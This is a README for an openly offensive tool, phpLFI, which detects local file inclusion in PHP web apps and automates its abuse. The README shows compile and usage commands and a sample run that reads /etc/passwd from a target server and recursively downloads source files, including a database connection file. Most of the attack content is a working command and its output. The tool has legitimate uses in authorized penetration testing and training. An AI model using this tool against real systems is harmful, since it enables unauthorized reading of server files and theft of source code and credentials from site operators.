# phpLFI
Tests for LFI in PHP apps and automates the process of abusing LFI's to download source code and discover new files via includes and recursively download additional source code files.

Compile it: `nim c phpLFI.nim`

Give it at least one php file for the -f option. I recommend you run gobuster/ffuf/dirb/dirsearch/etc with the wordlist "SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt" (not included, get it from: https://github.com/danielmiessler/SecLists) to discover more php files and feed any discovered words to the -f parameter as comma separated values.

Please note that this program is limited to discovering and exploiting LFI in PHP only, and only when a single '=' appears in the URL. I may add the ability to test/exploit multiple params at a later date, but feel free to contribute that feature if you need it and can't wait. :)

```
$ ./phpLFI -u:'http://192.168.0.100/image.php?img=blah.jpg' -f:login.php,blah.php

[!] LFI found in url. Successfully accessed /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
mike:x:1000:1000:mike:/home/mike:/bin/bash


[i] Searching php files for includes...

Discovered a file: header.php
Discovered a file: db_conn.php
Discovered a file: index.php
Discovered a file: index.php
Discovered a file: footer.php
Checking file: login.php
    Saving file: login.php
Checking file: header.php
    Saving file: header.php
Checking file: db_conn.php
    Saving file: db_conn.php
Checking file: index.php
    Saving file: index.php
Checking file: footer.php
    Saving file: footer.php
```
